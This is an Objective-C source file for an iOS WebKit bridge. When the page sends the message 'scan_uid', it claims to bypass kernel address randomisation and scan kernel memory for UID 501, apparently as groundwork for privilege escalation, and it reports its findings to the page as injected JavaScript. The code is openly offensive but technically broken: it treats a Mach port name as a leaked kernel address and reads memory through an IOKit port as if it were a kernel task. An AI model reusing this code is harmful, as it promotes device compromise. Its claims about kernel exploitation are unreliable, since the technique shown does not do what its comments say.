#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <mach/mach.h>
#include <dlfcn.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, unsafe_unretained) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        
        // 1. Obter Porta de Hardware (MainPort)
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
        typedef kern_return_t (*IOMainPortFunc)(mach_port_t, mach_port_t *);
        IOMainPortFunc get_main_port = (IOMainPortFunc)dlsym(iokit, "IOMainPort");
        mach_port_t mainPort;
        get_main_port(MACH_PORT_NULL, &mainPort);

        // 2. AUTO-LOCALIZAR BASE DO KERNEL (Bypass de KASLR)
        // Usamos o endereço de uma porta real para descobrir onde o kernel está "escondido"
        uint64_t leaked_addr = (uint64_t)mach_host_self(); 
        // Alinhamos para o início da página (16KB no A13)
        uint64_t search_base = leaked_addr & ~0x3FFFULL; 

        NSString *info = [NSString stringWithFormat:@"log('🔍 KASLR Leak: 0x%llx. Iniciando Deep Scan...')", search_base];
        [self.webView evaluateJavaScript:info completionHandler:nil];

        BOOL found = NO;
        // Varredura mais profunda (16MB ao redor do leak)
        for (int i = 0; i < 1024; i++) {
            vm_address_t addr = (vm_address_t)(search_base + (i * 0x4000));
            vm_size_t size = 0;
            vm_region_basic_info_data_64_t reg_info;
            mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
            mach_port_t obj = MACH_PORT_NULL;

            if (vm_region_64(mainPort, &addr, &size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&reg_info, &count, &obj) == KERN_SUCCESS) {
                // Procurando o UID 501
                for (vm_address_t p = addr; p < addr + size; p += 4) {
                    vm_offset_t data; mach_msg_type_number_t sz = 4;
                    if (vm_read(mainPort, p, 4, &data, &sz) == KERN_SUCCESS) {
                        if (*(uint32_t *)data == 501) {
                            NSString *res = [NSString stringWithFormat:@"log('🎯 <b>UID 501 LOCALIZADO:</b> 0x%lx')", (unsigned long)p];
                            [self.webView evaluateJavaScript:res completionHandler:nil];
                            found = YES; break;
                        }
                    }
                }
            }
            if (found) break;
        }
        if (!found) [self.webView evaluateJavaScript:@"log('⚠️ UID não encontrado. Tente reiniciar o App para novo Slide.')" completionHandler:nil];
        if (iokit) dlclose(iokit);
    }
}
@end
